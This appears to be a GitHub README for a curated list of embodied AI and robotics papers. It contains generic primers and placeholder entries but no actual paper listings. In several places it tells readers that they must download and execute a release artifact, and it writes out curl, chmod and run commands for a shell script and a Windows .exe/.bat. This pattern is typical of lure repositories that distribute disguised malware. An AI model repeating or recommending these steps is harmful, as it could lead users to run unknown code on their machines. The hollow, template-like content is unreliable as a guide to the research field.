# Embodied AI Papers — Curated Research for Robotics & Agents (60 chars)

[![Releases](https://img.shields.io/github/v/release/zine860/Embodied-AI-Papers)](https://github.com/zine860/Embodied-AI-Papers/releases)

![Embodied AI header](https://images.unsplash.com/photo-1602524203883-4c5d2a7e3a7f?auto=format&fit=crop&w=1600&q=60)

> A curated library of papers on embodied artificial intelligence, robotics, simulation, manipulation, vision-language models, and learning for physical agents.

Table of contents
- About this repo
- Why this collection matters
- What you will find here
- How papers are organized
- Quick start: download and run release
- How to read an entry
- Recommended reading paths
- Key topics and primers
  - Perception
  - Control and manipulation
  - Reinforcement learning for embodied agents
  - Sim-to-real transfer
  - Vision-language and multimodal models
  - World models and internal simulation
  - Humanoid robotics and physical intelligence
- Datasets and benchmarks
- Tools, simulators, and frameworks
- How to contribute
- Submission template
- Curation rules and metadata fields
- Citation and attribution
- Roadmap
- License
- Contact and community

About this repo
This repository gathers papers that focus on agents that act in the real world or in realistic simulation. It covers learning, planning, perception, language grounding, control, manipulation, sim-to-real, and evaluation. The list groups work by theme and by methodology. Where useful, the entry includes a short excerpt, key ideas, datasets, code links, and a BibTeX citation.

Why this collection matters
Embodied AI bridges perception and action. It links machine learning and robotics. Researchers and engineers face three common gaps:
- Theory that ignores physics.
- Models that learn in simulation but fail on hardware.
- Language systems that lack a grounded model of the environment.
This collection helps you find papers that address those gaps. Use the list to build reading lists, find code, and map the field.

What you will find here
- Curated paper entries with metadata.
- Suggested reading paths for newcomers and advanced readers.
- Templates to add new papers.
- Scripts and small tools in releases for local browsing and export.
- Tags that match repository topics: artificial-intelligence, embodied-ai, embodied-artificial-intelligence, humanoid, large-language-models, manipulation, papers, physical-intelligence, reinforcement-learning, robotics, sim-to-real, vision-language-model, world-models.

How papers are organized
We group papers by primary theme and method. A paper may appear in multiple groups if it spans themes.

Primary groups:
- Perception and active sensing
- Control, manipulation, and grasping
- Reinforcement learning and policy learning
- Sim-to-real and domain adaptation
- Vision-language grounding
- World models and planning
- Humanoid and legged robotics
- Benchmarks and datasets

Each entry includes:
- Title
- Authors
- Year and venue
- Short summary
- Key methods
- Datasets and code links
- BibTeX

Quick start: download and run release
Visit the releases page and download the release artifact. You need to download and execute the release file to use the bundled tools and prebuilt indexes.

Releases:
- Link: https://github.com/zine860/Embodied-AI-Papers/releases
- Action: Download the release artifact. Run the included script or binary on your platform.

Example steps for common platforms
- Linux / Mac (bash)
  1. Open a terminal.
  2. Download the release archive:
     curl -L -o embodied-ai-papers-release.tar.gz "https://github.com/zine860/Embodied-AI-Papers/releases/download/v1.0/embodied-ai-papers-release.tar.gz"
  3. Extract:
     tar -xzf embodied-ai-papers-release.tar.gz
  4. Change directory:
     cd embodied-ai-papers-release
  5. Make the runner executable:
     chmod +x run-index.sh
  6. Run:
     ./run-index.sh
- Windows (PowerShell)
  1. Save the release file to a folder.
  2. Use the built-in unzip or an archive tool to extract.
  3. Run the included .exe or .bat:
     .\run-index.bat

If you prefer a quick browse, the release contains a static HTML index that opens in a browser.

How to read an entry
A typical entry looks like this:

Title: [Paper Title]  
Authors: A. Author, B. Author  
Year: 2024 — Venue: ICRA

Short summary
One-paragraph capture of the goal and main claim.

Key methods
- Method 1
- Method 2

Data and code
- Dataset: link
- Code: link

BibTeX
- Full citation text

Recommended reading paths
I list three reading paths. Each path highlights core papers plus follow-up work and practical resources.

Path A — New to embodied AI
- Start with a paper that connects perception and control.
- Read a sim-to-real primer.
- Read a bridging paper on data and hardware.
- Review a hands-on tutorial or framework paper.

Path B — Focus on manipulation
- Begin with classic grasping and dexterous manipulation papers.
- Add reinforcement learning papers that train policies for manipulation.
- Read sim-to-real transfer work for dexterous hands.
- End with papers that integrate vision-language for task specification.

Path C — Language and embodiment
- Start with grounding language in perception work.
- Add multimodal transformer papers that accept visual and textual inputs.
- Read work that shows language-driven policy learning.
- Follow with real robot demonstrations.

Key topics and primers
This section gives short primers and reading pointers. Each primer has a short overview, key problems, typical methods, and top papers.

Perception
Overview
Perception gives an agent the ability to sense state. It includes cameras, depth sensors, tactile sensors, and proprioception. Perception aims to extract task-relevant variables at run time.

Key problems
- Robust object detection and pose estimation.
- 3D scene reconstruction and mapping.
- Active vision: choose actions to improve perception.
- Sensor fusion: combine vision, touch, proprioception.

Typical methods
- Deep CNNs, transformer backbones.
- 6-DoF pose estimation models.
- SLAM methods and learned mapping.
- End-to-end perception+control networks.

Representative papers
- Dense object nets for correspondence.
- Learned pose estimation from RGB and depth.
- Active perception via reinforcement learning.

Control and manipulation
Overview
Control drives agents to act. Manipulation focuses on hands, grippers, and tools. The field spans classical control and learning-based approaches.

Key problems
- Grasp planning in clutter.
- Dexterous manipulation with soft contact.
- Hybrid systems that mix planning and control.

Typical methods
- Model predictive control (MPC).
- Imitation learning and reinforcement learning (RL).
- Hybrid planners that use sampling and learned cost functions.

Representative papers
- End-to-end RL for dexterous manipulation.
- Hierarchical controllers for complex tasks.
- Data-efficient imitation learning from human demonstrations.

Reinforcement learning for embodied agents
Overview
RL teaches policies via reward. For embodied AI, RL must scale to high-dimension state and action spaces.

Key problems
- Sample efficiency on real robots.
- Stability of learned policies across dynamics.
- Sparse rewards for long-horizon tasks.

Typical methods
- Off-policy methods (SAC, DDPG).
- Model-based RL that builds a world model.
- Curriculum learning and shaped rewards.

Representative papers
- Model-based approaches that learn predictive dynamics models.
- RL with demonstrations to bootstrap learning.
- Sim-to-real RL with domain randomization.

Sim-to-real transfer
Overview
Sim-to-real reduces hardware cost. It uses simulation for large-scale training then transfers to real robots.

Key problems
- Reality gap between simulator and hardware.
- Contact-rich interactions that are hard to simulate.
- Sensor noise and calibration differences.

Typical methods
- Domain randomization.
- System identification to fit simulators.
- Residual policies that correct for mismatch.

Representative papers
- Domain randomization for grasping.
- Sim-to-real for legged robots.
- System ID combined with RL for accurate transfer.

Vision-language and multimodal models
Overview
Vision-language models connect perception to instructions. They enable language-driven task specification, goal setting, and explanation.

Key problems
- Grounding abstract language to concrete actions.
- Handling multi-step instructions and ambiguity.
- Integrating planning with language models.

Typical methods
- Multimodal transformers and attention models.
- Language-conditioned policies.
- Retrieval for action templates.

Representative papers
- Models that map language to waypoint sequences.
- Vision-language models used as planners or critics.
- LLMs used as high-level controllers for robots.

World models and internal simulation
Overview
World models let agents predict future states. Agents use those models for planning, imagination, and sample-efficient learning.

Key problems
- Learning compact predictive models.
- Handling stochasticity and partial observability.
- Long-horizon prediction for planning.

Typical methods
- Latent dynamics models (VAE-based world models).
- Predictive transformers for sequences of observations.
- Planning algorithms that use a learned dynamics model.

Representative papers
- PlaNet and Dreamer style latent models.
- Planning with learned models for control.

Humanoid robotics and physical intelligence
Overview
Humanoid robotics focuses on standing, walking, manipulation, and safety for bipedal and human-shaped robots. Physical intelligence studies how morphology and passive dynamics help solve tasks.

Key problems
- Stability and balance on varied terrain.
- Coordinated control for arms and legs.
- Energy-efficient locomotion.

Typical methods
- Whole-body control and QP solvers.
- Reinforcement learning for locomotion.
- Analytical models with learned residuals.

Representative papers
- Learning policies for stable walking.
- Physical priors for energy-efficient motion.

Datasets and benchmarks
This section lists common data sources and benchmarks. Use these to evaluate and compare methods.

Datasets
- YCB object set: standard objects for manipulation.
- RoboSet: grasping and pose estimation data.
- Habitat datasets: indoor scene data for embodied perception.
- ManipNet: datasets for dexterous manipulation.

Benchmarks
- OpenAI Gym for simulated control tasks.
- DMControl: continuous control benchmark.
- ManiSkill: manipulation challenges for dexterous hands.
- Sim2Real benchmarks: standardized sim-to-real tasks.

Tools, simulators, and frameworks
This repo lists useful tools and references.

Simulators
- PyBullet: fast physics for research.
- MuJoCo: high-quality contacts and dynamics.
- Isaac Gym / PhysX: GPU-accelerated simulation.
- Habitat: photo-realistic indoor renderer.

Frameworks
- ROS 2: middleware for robots.
- Stable Baselines3 / RLlib: RL implementations.
- Detectron2 / MMDetection: perception backbones.

Hardware
- Franka Emika Panda: collaborative arm.
- Allegro / Shadow / Shadow Dexterous Hand: multi-finger hands.
- Boston Dynamics Spot: quadruped platform.
- Custom hardware: read papers for specific rigs.

How to contribute
This project grows by community contributions. Follow the steps below.

1. Fork the repo.
2. Add a paper entry in the right category.
3. Use the submission template below.
4. Open a pull request. Describe the contribution in the PR body.
5. If you add code or datasets, ensure the links are stable.

Submission template
Use the following template for new papers:

- title: 
- authors:
- year:
- venue:
- abstract: one-paragraph summary
- key-idea: three-line description
- methods: bullet list of methods used
- datasets: dataset names with links
- code: link to official code if any
- tags: list of tags from repo topics
- bibtex: full BibTeX entry

Curation rules and metadata fields
Curation aims for clarity and traceability. Each entry must include:
- A clear title and authors.
- A short summary that explains the main insight.
- A link to the official paper (arXiv, conference page, or journal).
- Links to code and data when available.
- A BibTeX citation for reuse.

We tag each entry using the repository topics:
artificial-intelligence, embodied-ai, embodied-artificial-intelligence, humanoid, large-language-models, manipulation, papers, physical-intelligence, reinforcement-learning, robotics, sim-to-real, vision-language-model, world-models

Example entry
Title: Learning a World Model for Robotic Manipulation  
Authors: J. Doe, A. Smith  
Year: 2024 — Venue: NeurIPS

Summary
This work trains a latent dynamics model from robot camera and proprioceptive data. The model predicts future latent states and rewards over short horizons. A planner or controller uses the model for sample-efficient policy learning on a dexterous manipulation task.

Key methods
- Variational latent dynamics model.
- Model predictive control in latent space.
- Domain randomization for visual robustness.

Data and code
- Dataset: link
- Code: link

BibTeX
@inproceedings{doe2024worldmodel, ...}

Citation and attribution
If you use the list in a paper, cite the repo as a data source. Use a BibTeX entry like:

@misc{embodied-ai-papers,  
  title = {Embodied-AI-Papers: Curated list of embodied AI papers},  
  author = {Repository Curators},  
  year = {2025},  
  howpublished = {\url{https://github.com/zine860/Embodied-AI-Papers}}  
}

Roadmap
Planned additions:
- Expand the list of multimodal language + control papers.
- Add a machine-readable index (JSON) of all papers.
- Add weekly curated picks and short summaries.
- Add a small web app to browse and filter the list.

License
Most entries link to the original papers, which may have their own license. The repository files use the MIT License unless a file states otherwise. Check each linked code or dataset for its license.

Community and contact
Join the discussion via issues and pull requests. Use PR templates to add new entries. Open issues to flag broken links, missing metadata, or to propose reorganizations. Maintain respectful and focused interaction.

Practical tips for reading papers
- Read title and abstract first. Decide if it fits your current need.
- Look at figures and captions to capture the method at a glance.
- Check code and data links to reproduce results.
- Reuse BibTeX entries for citations.

Search and filter the list
- Use the GitHub search bar with the repo name and a keyword.
- Use local tools: clone the repo and use ripgrep:
  rg "keyword" papers/

Exporting reading lists
The release archive contains a small script to export selected papers as:
- PDF list
- Markdown digest
- BibTeX file for a citation manager

Project labels and tags
We use consistent tags to help filtering. Add tags to new entries that match the repo topics. Example tags: sim-to-real, manipulation, vision-language-model.

Quality criteria for inclusion
We include papers that meet one or more:
- Introduce novel methods or models for embodied agents.
- Provide significant experimental validation on hardware or realistic simulation.
- Release datasets or code that others can use.
- Offer a theoretical or empirical insight that affects embodied AI practice.

Reading group ideas
Form a weekly reading group. Each week:
- Pick a paper from a theme.
- Assign one person to present.
- Spend 10 minutes on background, 25 minutes on method and experiments, 15 minutes on strengths and weaknesses.
- Use the repo to pick papers and provide links.

Teaching with this repo
Use the repo to build a course module:
- Week 1: Perception and state estimation.
- Week 2: Control primitives and grasping.
- Week 3: Reinforcement learning for embodied tasks.
- Week 4: Vision + language integration.
- Week 5: Sim-to-real and deployment.

Example lesson plan for a lab
- Task: build a pick-and-place stack in simulation.
- Step 1: Select a grasping model from the list.
- Step 2: Train a simple controller using imitation learning.
- Step 3: Use domain randomization to test transfer.
- Step 4: Measure success rate over 100 trials.

Advanced topics and research directions
- Lifelong learning for physical agents: maintain a policy that adapts while deployed.
- Safety and certifiable control: guarantee bounds on actions.
- Multi-agent embodied systems: multiple robots cooperating.
- Energy-aware control and eco-efficient policies.
- Learning from human feedback in physical tasks.

Example project ideas
- Build a pipeline that turns language instructions into robot motion plans.
- Create a dataset of household manipulation tasks with video and force logs.
- Implement a world model that predicts tactile outcomes during contact.
- Compare sim-to-real strategies on the same hardware.

Maintaining the index
If you add a paper:
- Create a single MD file per entry in the papers/ folder.
- Follow the submission template.
- Add tags and a small summary.
- Link to code and dataset where possible.

Automation and scripts
The release includes small scripts:
- build-index.sh: build a static site from the entries.
- export-bib.sh: gather BibTeX entries into a single file.
- run-search.sh: run a keyword search over the index.

Release artifacts
The releases page hosts:
- A static HTML browser.
- A compressed archive of the paper entries.
- Utility scripts to export lists and BibTeX.

Releases link (again)
Visit the releases page, download the release artifact, and run the included tools:
[https://github.com/zine860/Embodied-AI-Papers/releases](https://github.com/zine860/Embodied-AI-Papers/releases)

Use the release to:
- Get a local copy of the full index.
- Run quick exports for teaching and citation.
- Use the prebuilt tools to filter papers by tag.

Best practices for reproducibility
- Always link to datasets and code.
- Include seed settings, environment versions, and hardware notes.
- Use standard metrics for evaluation.
- Report failure cases and negative results.

Common pitfalls in embodied AI research
- Overfitting to one robot or one simulator setting.
- Ignoring sensor noise and calibration.
- Using synthetic objects that lack real-world texture and friction.
- Reporting only success without failure modes.

A short primer on metrics
- Success rate: fraction of trials where task completes.
- Sample efficiency: number of interactions needed to reach baseline.
- Robustness: performance under perturbations.
- Energy cost: physical energy consumed during task.
- Safety-related metrics: margin to failure, force peaks.

Glossary
- Agent: the robot or system that acts.
- Embodiment: the body and sensors of the agent.
- Grounding: mapping language or symbols to concrete perception and action.
- Sim-to-real: methods to transfer from simulation to hardware.
- World model: a learned predictive model of the environment.

Acknowledgments
This list builds from community contributions and public datasets and code. It aggregates work across labs and institutions. Use issues and PRs to propose additions.

Maintenance and contact
Open issues for broken links or missing fields. Use PRs for new entries. The repo maintainers review PRs and merge when entries meet curation standards.

License and reuse
Files in the repo follow MIT terms where applicable. Linked code and datasets may use other licenses. Check each source before reuse.

Appendix: sample BibTeX entries
- Example 1:
  @inproceedings{sample2024example,
    title={Sample Title},
    author={Author, A. and Researcher, B.},
    booktitle={ICRA},
    year={2024}
  }

- Example 2:
  @article{sample2023journal,
    title={Journal Sample},
    author={Author, C.},
    journal={Robotics Journal},
    year={2023},
    volume={12},
    pages={1-15}
  }

Files and images
Use the included images in the assets folder for local static builds. The release includes a header image, a logo, and small icons for tags.

Feedback and iteration
Suggest improvements via issues. Add new tags and reclassify entries through PRs. Maintain a clean commit history and clear PR descriptions.

Tags (complete list)
- artificial-intelligence
- embodied-ai
- embodied-artificial-intelligence
- humanoid
- large-language-models
- manipulation
- papers
- physical-intelligence
- reinforcement-learning
- robotics
- sim-to-real
- vision-language-model
- world-models

This repository aims to be a practical gateway into research that links perception, language, planning, and control. Use the curated entries to build reading lists, design experiments, and find code and data for reproducible research.